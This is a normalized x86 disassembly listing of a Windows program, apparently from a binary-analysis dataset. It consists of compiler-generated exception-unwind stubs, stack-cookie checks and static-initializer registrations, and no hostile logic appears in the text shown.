sub_43f083
mov eax [ ebp - 0x30 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffff7
lea ecx [ ebp - 0x54 ]
jmp sub_410038
sub_43f09c
lea ecx [ ebp - 0x98 ]
jmp sub_410038
sub_43f0a7
push [ ebp - 0x60 ]
call sub_42412e
pop ecx
retn
sub_43f0b1
mov eax [ ebp - 0x30 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x30 ] 0xffffffef
lea ecx [ ebp - 0xd0 ]
jmp sub_410038
sub_43f0cd
mov eax [ ebp - 0x30 ]
and eax 0x20
je r-xdata
retn
and [ ebp - 0x30 ] 0xffffffdf
lea ecx [ ebp - 0x98 ]
jmp sub_410038
sub_43f0e9
lea ecx [ ebp - 0x54 ]
jmp sub_410038
sub_43f0f1
lea ecx [ ebp - 0x7c ]
jmp sub_410038
sub_43f0f9
lea ecx [ ebp - 0x54 ]
jmp sub_410038
sub_43f101
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xf0 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f129
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f131
push [ ebp - 0x34 ]
call sub_42412e
pop ecx
retn
sub_43f13b
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
lea ecx [ ebp - 0xb4 ]
jmp sub_410038
sub_43f157
mov eax [ ebp - 0x30 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0xd0 ]
jmp sub_410038
sub_43f173
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43f17b
lea ecx [ ebp - 0x7c ]
jmp sub_410038
sub_43f183
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43f18b
push [ ebp - 0x34 ]
call sub_42412e
pop ecx
retn
sub_43f195
mov eax [ ebp - 0x30 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffb
lea ecx [ ebp - 0x60 ]
jmp sub_410038
sub_43f1ae
mov eax [ ebp - 0x30 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffff7
lea ecx [ ebp - 0x7c ]
jmp sub_410038
sub_43f1c7
lea ecx [ ebp - 0x98 ]
jmp sub_410038
sub_43f1d2
push [ ebp - 0x40 ]
call sub_42412e
pop ecx
retn
sub_43f1dc
mov eax [ ebp - 0x30 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x30 ] 0xffffffef
lea ecx [ ebp - 0x98 ]
jmp sub_410038
sub_43f1f8
lea ecx [ ebp - 0x7c ]
jmp sub_410038
sub_43f200
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd8 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f228
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f230
push [ ebp - 0x34 ]
call sub_42412e
pop ecx
retn
sub_43f23a
mov eax [ ebp - 0x30 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffe
lea ecx [ ebp - 0xc4 ]
jmp sub_410038
sub_43f256
mov eax [ ebp - 0x30 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0xa8 ]
jmp sub_410038
sub_43f272
lea ecx [ ebp - 0x54 ]
jmp sub_410038
sub_43f27a
lea ecx [ ebp - 0x54 ]
jmp sub_410038
sub_43f282
lea ecx [ ebp - 0x8c ]
jmp sub_410038
sub_43f28d
lea ecx [ ebp - 0x54 ]
jmp sub_410038
sub_43f295
push [ ebp - 0x38 ]
call sub_42412e
pop ecx
retn
sub_43f29f
mov eax [ ebp - 0x30 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffffb
lea ecx [ ebp - 0x54 ]
jmp sub_410038
sub_43f2b8
mov eax [ ebp - 0x30 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x30 ] 0xfffffff7
lea ecx [ ebp - 0x8c ]
jmp sub_410038
sub_43f2d4
lea ecx [ ebp - 0x70 ]
jmp sub_410038
sub_43f2dc
push [ ebp - 0x38 ]
call sub_42412e
pop ecx
retn
sub_43f2e6
mov eax [ ebp - 0x30 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x30 ] 0xffffffef
lea ecx [ ebp - 0x70 ]
jmp sub_410038
sub_43f2ff
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc8 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f327
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43f32f
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f337
push [ ebp - 0x8c ]
call sub_42412e
pop ecx
retn
sub_43f344
mov eax [ ebp - 0x90 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x90 ] 0xfffffffe
lea ecx [ ebp - 0x64 ]
jmp sub_410038
sub_43f363
mov eax [ ebp - 0x90 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x90 ] 0xfffffffd
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f382
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f38a
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43f392
push [ ebp - 0x8c ]
call sub_42412e
pop ecx
retn
sub_43f39f
mov eax [ ebp - 0x90 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x90 ] 0xfffffffb
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f3be
push [ ebp - 0x8c ]
call sub_42412e
pop ecx
retn
sub_43f3cb
mov eax [ ebp - 0x90 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x90 ] 0xfffffff7
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f3ea
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f3f2
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f3fa
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f402
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43f40a
push [ ebp - 0x8c ]
call sub_42412e
pop ecx
retn
sub_43f417
mov eax [ ebp - 0x90 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x90 ] 0xffffffef
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43f436
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f457
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43f45f
lea ecx [ ebp - 0x64 ]
jmp sub_410038
sub_43f467
mov eax [ ebp - 0x8c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x8c ] 0xfffffffe
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f486
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f4a7
push [ ebp - 0x10 ]
call sub_42412e
pop ecx
retn
sub_43f4b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f4cc
push [ ebp - 0x1b8 ]
call sub_42412e
pop ecx
retn
sub_43f4d9
mov eax [ ebp - 0x1bc ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x1bc ] 0xfffffffe
lea ecx [ ebp - 0x17c ]
jmp sub_410038
sub_43f4fb
mov eax [ ebp - 0x1bc ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x1bc ] 0xfffffffd
lea ecx [ ebp - 0x144 ]
jmp sub_410038
sub_43f51d
lea ecx [ ebp - 0x1b4 ]
jmp sub_410038
sub_43f528
lea ecx [ ebp - 0x128 ]
jmp sub_410038
sub_43f533
lea ecx [ ebp - 0x10c ]
jmp sub_410038
sub_43f53e
lea ecx [ ebp - 0x198 ]
jmp sub_410038
sub_43f549
lea ecx [ ebp - 0xf0 ]
jmp sub_410038
sub_43f554
lea esi [ ebp - 0xb8 ]
jmp sub_4011ad
sub_43f55f
lea ecx [ ebp - 0x160 ]
jmp sub_410038
sub_43f56a
lea ecx [ ebp - 0xd4 ]
jmp sub_410038
sub_43f575
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1bc ]
mov ecx [ edx - 0x1c0 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f596
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43f5a1
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43f5ab
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0xa8 ]
jmp sub_410038
sub_43f5c7
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0x84 ]
jmp sub_410038
sub_43f5e3
lea ecx [ ebp - 0x34 ]
jmp sub_410038
sub_43f5eb
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43f5f3
lea ecx [ ebp - 0x34 ]
jmp sub_410038
sub_43f5fb
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43f603
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43f60d
mov eax [ ebp - 0x10 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffb
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43f626
mov eax [ ebp - 0x10 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffff7
lea ecx [ ebp - 0x34 ]
jmp sub_410038
sub_43f63f
lea ecx [ ebp - 0xc4 ]
jmp sub_410038
sub_43f64a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc8 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f668
lea ecx [ ebp - 0x1bc ]
jmp sub_410038
sub_43f673
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0xdc ]
jmp sub_410038
sub_43f68f
mov eax [ ebp - 0x14 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffd
lea ecx [ ebp - 0x14c ]
jmp sub_410038
sub_43f6ab
mov eax [ ebp - 0x14 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffb
lea ecx [ ebp - 0xa4 ]
jmp sub_410038
sub_43f6c7
mov eax [ ebp - 0x14 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffff7
lea ecx [ ebp - 0x184 ]
jmp sub_410038
sub_43f6e3
mov eax [ ebp - 0x14 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffffef
lea ecx [ ebp - 0x6c ]
jmp sub_410038
sub_43f6fc
mov eax [ ebp - 0x14 ]
and eax 0x20
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffffdf
lea ecx [ ebp - 0xc0 ]
jmp sub_410038
sub_43f718
mov eax [ ebp - 0x14 ]
and eax 0x40
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffffbf
lea ecx [ ebp - 0x88 ]
jmp sub_410038
sub_43f734
mov eax [ ebp - 0x14 ]
and eax 0x80
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffff7f
lea ecx [ ebp - 0x50 ]
jmp sub_410038
sub_43f752
mov eax [ ebp - 0x14 ]
and eax 0x100
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffeff
lea ecx [ ebp - 0x114 ]
jmp sub_410038
sub_43f773
mov eax [ ebp - 0x14 ]
and eax 0x200
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffdff
lea ecx [ ebp - 0x34 ]
jmp sub_410038
sub_43f791
mov eax [ ebp - 0x14 ]
and eax 0x400
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffbff
lea ecx [ ebp - 0x1d8 ]
jmp sub_410038
sub_43f7b2
mov eax [ ebp - 0x14 ]
and eax 0x800
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffff7ff
lea ecx [ ebp - 0x1a0 ]
jmp sub_410038
sub_43f7d3
mov eax [ ebp - 0x14 ]
and eax 0x1000
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffefff
lea ecx [ ebp - 0x168 ]
jmp sub_410038
sub_43f7f4
mov eax [ ebp - 0x14 ]
and eax 0x2000
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffdfff
lea ecx [ ebp - 0x130 ]
jmp sub_410038
sub_43f815
mov eax [ ebp - 0x14 ]
and eax 0x4000
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffbfff
lea ecx [ ebp - 0xf8 ]
jmp sub_410038
sub_43f836
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1e0 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f854
lea ecx [ ebp - 0x1a0 ]
jmp sub_410038
sub_43f85f
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0x34 ]
jmp sub_410038
sub_43f878
mov eax [ ebp - 0x14 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffd
lea ecx [ ebp - 0xc0 ]
jmp sub_410038
sub_43f894
mov eax [ ebp - 0x14 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffb
lea ecx [ ebp - 0x130 ]
jmp sub_410038
sub_43f8b0
mov eax [ ebp - 0x14 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffff7
lea ecx [ ebp - 0x88 ]
jmp sub_410038
sub_43f8cc
mov eax [ ebp - 0x14 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x14 ] 0xffffffef
lea ecx [ ebp - 0x168 ]
jmp sub_410038
sub_43f8e8
lea ecx [ ebp - 0x6c ]
jmp sub_410038
sub_43f8f0
lea ecx [ ebp - 0x50 ]
jmp sub_410038
sub_43f8f8
lea ecx [ ebp - 0xf8 ]
jmp sub_410038
sub_43f903
lea ecx [ ebp - 0xdc ]
jmp sub_410038
sub_43f90e
lea ecx [ ebp - 0xa4 ]
jmp sub_410038
sub_43f919
lea ecx [ ebp - 0x14c ]
jmp sub_410038
sub_43f924
lea ecx [ ebp - 0x114 ]
jmp sub_410038
sub_43f92f
lea ecx [ ebp - 0x184 ]
jmp sub_410038
sub_43f93a
lea ecx [ ebp - 0x1bc ]
jmp sub_410038
sub_43f945
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c0 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43f963
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f96b
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f973
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f97b
mov eax [ ebp - 0x88 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x88 ] 0xfffffffe
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f99a
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f9a2
mov eax [ ebp - 0x88 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x88 ] 0xfffffffd
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f9c1
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f9c9
mov eax [ ebp - 0x88 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x88 ] 0xfffffffb
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f9e8
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43f9f0
mov eax [ ebp - 0x88 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x88 ] 0xfffffff7
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa0f
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa17
mov eax [ ebp - 0x88 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x88 ] 0xffffffef
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa36
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa3e
mov eax [ ebp - 0x88 ]
and eax 0x20
je r-xdata
retn
and [ ebp - 0x88 ] 0xffffffdf
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa5d
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa65
mov eax [ ebp - 0x88 ]
and eax 0x40
je r-xdata
retn
and [ ebp - 0x88 ] 0xffffffbf
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa84
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fa8c
mov eax [ ebp - 0x88 ]
and eax 0x80
je r-xdata
retn
and [ ebp - 0x88 ] 0xffffff7f
lea ecx [ ebp - 0x64 ]
jmp sub_410038
sub_43fab0
mov eax [ ebp - 0x88 ]
and eax 0x100
je r-xdata
retn
and [ ebp - 0x88 ] 0xfffffeff
lea ecx [ ebp - 0x80 ]
jmp sub_410038
sub_43fad4
mov eax [ ebp - 0x88 ]
and eax 0x200
je r-xdata
retn
and [ ebp - 0x88 ] 0xfffffdff
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43faf8
mov eax [ ebp - 0x88 ]
and eax 0x400
je r-xdata
retn
and [ ebp - 0x88 ] 0xfffffbff
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43fb1c
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8c ]
mov ecx [ edx - 0x90 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43fb3e
lea ecx [ ebp - 0xf0 ]
jmp sub_410038
sub_43fb49
mov eax [ ebp - 0x454 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffffffe
lea ecx [ ebp - 0x374 ]
jmp sub_410038
sub_43fb6b
mov eax [ ebp - 0x454 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffffffd
lea ecx [ ebp - 0x144 ]
jmp sub_410038
sub_43fb8d
mov eax [ ebp - 0x454 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffffffb
lea ecx [ ebp - 0x3ac ]
jmp sub_410038
sub_43fbaf
mov eax [ ebp - 0x454 ]
and eax 0x8
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffffff7
lea ecx [ ebp - 0x224 ]
jmp sub_410038
sub_43fbd1
mov eax [ ebp - 0x454 ]
and eax 0x10
je r-xdata
retn
and [ ebp - 0x454 ] 0xffffffef
lea ecx [ ebp - 0x3e4 ]
jmp sub_410038
sub_43fbf3
mov eax [ ebp - 0x454 ]
and eax 0x20
je r-xdata
retn
and [ ebp - 0x454 ] 0xffffffdf
lea ecx [ ebp - 0x1b4 ]
jmp sub_410038
sub_43fc15
mov eax [ ebp - 0x454 ]
and eax 0x40
je r-xdata
retn
and [ ebp - 0x454 ] 0xffffffbf
lea ecx [ ebp - 0x304 ]
jmp sub_410038
sub_43fc37
mov eax [ ebp - 0x454 ]
and eax 0x80
je r-xdata
retn
and [ ebp - 0x454 ] 0xffffff7f
lea ecx [ ebp - 0x10c ]
jmp sub_410038
sub_43fc5e
mov eax [ ebp - 0x454 ]
and eax 0x100
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffffeff
lea ecx [ ebp - 0x33c ]
jmp sub_410038
sub_43fc85
mov eax [ ebp - 0x454 ]
and eax 0x200
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffffdff
lea ecx [ ebp - 0x1ec ]
jmp sub_410038
sub_43fcac
mov eax [ ebp - 0x454 ]
and eax 0x400
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffffbff
lea ecx [ ebp - 0x25c ]
jmp sub_410038
sub_43fcd3
mov eax [ ebp - 0x454 ]
and eax 0x800
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffff7ff
lea ecx [ ebp - 0x17c ]
jmp sub_410038
sub_43fcfa
mov eax [ ebp - 0x454 ]
and eax 0x1000
je r-xdata
retn
and [ ebp - 0x454 ] 0xffffefff
lea ecx [ ebp - 0x294 ]
jmp sub_410038
sub_43fd21
mov eax [ ebp - 0x454 ]
and eax 0x2000
je r-xdata
retn
and [ ebp - 0x454 ] 0xffffdfff
lea ecx [ ebp - 0x438 ]
jmp sub_410038
sub_43fd48
mov eax [ ebp - 0x454 ]
and eax 0x4000
je r-xdata
retn
and [ ebp - 0x454 ] 0xffffbfff
lea ecx [ ebp - 0x2cc ]
jmp sub_410038
sub_43fd6f
lea ecx [ ebp - 0x9c ]
jmp sub_410038
sub_43fd7a
push [ ebp - 0x440 ]
call sub_42412e
pop ecx
retn
sub_43fd87
mov eax [ ebp - 0x454 ]
and eax 0x8000
je r-xdata
retn
and [ ebp - 0x454 ] 0xffff7fff
lea ecx [ ebp - 0x400 ]
jmp sub_410038
sub_43fdae
mov eax [ ebp - 0x454 ]
and eax 0x10000
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffeffff
lea ecx [ ebp - 0x41c ]
jmp sub_410038
sub_43fdd5
lea ecx [ ebp - 0x3c8 ]
jmp sub_410038
sub_43fde0
lea ecx [ ebp - 0x358 ]
jmp sub_410038
sub_43fdeb
lea ecx [ ebp - 0x390 ]
jmp sub_410038
sub_43fdf6
push [ ebp - 0x448 ]
call sub_42412e
pop ecx
retn
sub_43fe03
mov eax [ ebp - 0x454 ]
and eax 0x20000
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffdffff
lea ecx [ ebp - 0x2e8 ]
jmp sub_410038
sub_43fe2a
mov eax [ ebp - 0x454 ]
and eax 0x40000
je r-xdata
retn
and [ ebp - 0x454 ] 0xfffbffff
lea ecx [ ebp - 0x320 ]
jmp sub_410038
sub_43fe51
lea ecx [ ebp - 0x2b0 ]
jmp sub_410038
sub_43fe5c
push [ ebp - 0x43c ]
call sub_42412e
pop ecx
retn
sub_43fe69
mov eax [ ebp - 0x454 ]
and eax 0x80000
je r-xdata
retn
and [ ebp - 0x454 ] 0xfff7ffff
lea ecx [ ebp - 0x278 ]
jmp sub_410038
sub_43fe90
push [ ebp - 0x43c ]
call sub_42412e
pop ecx
retn
sub_43fe9d
mov eax [ ebp - 0x454 ]
and eax 0x100000
je r-xdata
retn
and [ ebp - 0x454 ] 0xffefffff
lea ecx [ ebp - 0x240 ]
jmp sub_410038
sub_43fec4
lea ecx [ ebp - 0x208 ]
jmp sub_410038
sub_43fecf
mov eax [ ebp - 0x454 ]
and eax 0x200000
je r-xdata
retn
and [ ebp - 0x454 ] 0xffdfffff
lea ecx [ ebp - 0x160 ]
jmp sub_410038
sub_43fef6
mov eax [ ebp - 0x454 ]
and eax __dos_header
je r-xdata
retn
and [ ebp - 0x454 ] 0xffbfffff
lea ecx [ ebp - 0x198 ]
jmp sub_410038
sub_43ff1d
mov eax [ ebp - 0x454 ]
and eax 0x800000
je r-xdata
retn
and [ ebp - 0x454 ] 0xff7fffff
lea ecx [ ebp - 0x1d0 ]
jmp sub_410038
sub_43ff44
lea ecx [ ebp - 0x80 ]
jmp sub_41c35c
sub_43ff4c
push [ ebp - 0x444 ]
call sub_42412e
pop ecx
retn
sub_43ff59
mov eax [ ebp - 0x454 ]
and eax 0x1000000
je r-xdata
retn
and [ ebp - 0x454 ] 0xfeffffff
lea ecx [ ebp - 0x128 ]
jmp sub_410038
sub_43ff80
mov eax [ ebp - 0x454 ]
and eax 0x2000000
je r-xdata
retn
and [ ebp - 0x454 ] 0xfdffffff
lea ecx [ ebp - 0xb8 ]
jmp sub_410038
sub_43ffa7
push [ ebp - 0x444 ]
call sub_42412e
pop ecx
retn
sub_43ffb4
mov eax [ ebp - 0x454 ]
and eax 0x4000000
je r-xdata
retn
and [ ebp - 0x454 ] 0xfbffffff
lea ecx [ ebp - 0xd4 ]
jmp sub_410038
sub_43ffdb
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x454 ]
mov ecx [ edx - 0x458 ]
xor ecx eax
call sub_4234de
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_440009
mov ecx rw-data
jmp sub_410038
sub_440013
mov ecx rw-data
jmp sub_410038
sub_44001d
mov ecx rw-data
jmp sub_410038
sub_440027
mov ecx rw-data
jmp sub_410038
sub_440031
mov ecx rw-data
jmp sub_410038
sub_44003b
mov ecx rw-data
jmp sub_410038
sub_440045
mov ecx rw-data
jmp sub_410038
sub_44004f
mov ecx rw-data
jmp sub_410038
sub_440059
mov ecx rw-data
jmp sub_410038
sub_440063
mov ecx rw-data
jmp sub_410038
sub_44006d
mov ecx rw-data
jmp sub_410038
sub_440077
mov ecx rw-data
jmp sub_410038
sub_440081
mov ecx rw-data
jmp sub_410038
sub_44008b
mov ecx rw-data
jmp sub_410038
sub_440095
mov ecx rw-data
jmp sub_410038
sub_44009f
mov ecx rw-data
jmp sub_410038
sub_4400a9
mov ecx rw-data
jmp sub_410038
sub_4400b3
mov ecx rw-data
jmp sub_410038
sub_4400bd
mov ecx rw-data
jmp sub_410038
sub_4400c7
mov ecx rw-data
jmp sub_410038
sub_4400d1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_4400ec
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440cf2
call sub_424852
pop ecx
retn
sub_4404cd
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d01
call sub_424852
pop ecx
retn
sub_4404e8
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d10
call sub_424852
pop ecx
retn
sub_440503
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d1f
call sub_424852
pop ecx
retn
sub_44051e
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d2e
call sub_424852
pop ecx
retn
sub_440539
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d3d
call sub_424852
pop ecx
retn
sub_440554
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d4c
call sub_424852
pop ecx
retn
sub_44056f
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d5b
call sub_424852
pop ecx
retn
sub_44058a
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d6a
call sub_424852
pop ecx
retn
sub_4405a5
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d79
call sub_424852
pop ecx
retn
sub_4405c0
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d88
call sub_424852
pop ecx
retn
sub_4405db
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440d97
call sub_424852
pop ecx
retn
sub_4405f6
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440da6
call sub_424852
pop ecx
retn
sub_440611
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440db5
call sub_424852
pop ecx
retn
sub_44062c
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440dc4
call sub_424852
pop ecx
retn
sub_440647
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440dd3
call sub_424852
pop ecx
retn
sub_440662
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440de2
call sub_424852
pop ecx
retn
sub_44067d
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440df1
call sub_424852
pop ecx
retn
sub_440698
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e00
call sub_424852
pop ecx
retn
sub_4406b3
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e0f
call sub_424852
pop ecx
retn
sub_4406ce
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e1e
call sub_424852
pop ecx
retn
sub_4406e9
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e2d
call sub_424852
pop ecx
retn
sub_440704
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e3c
call sub_424852
pop ecx
retn
sub_44071f
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e4b
call sub_424852
pop ecx
retn
sub_44073a
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e5a
call sub_424852
pop ecx
retn
sub_440755
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e69
call sub_424852
pop ecx
retn
sub_440770
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e78
call sub_424852
pop ecx
retn
sub_44078b
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e87
call sub_424852
pop ecx
retn
sub_4407a6
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440e96
call sub_424852
pop ecx
retn
sub_4407c1
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440ea5
call sub_424852
pop ecx
retn
sub_4407dc
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440eb4
call sub_424852
pop ecx
retn
sub_4407f7
push r--data
mov ecx rw-data
call sub_403dc1
push sub_440ec3
call sub_424852
pop ecx
retn
sub_440812
push r--data
mov ecx rw-data
call sub_403dc1
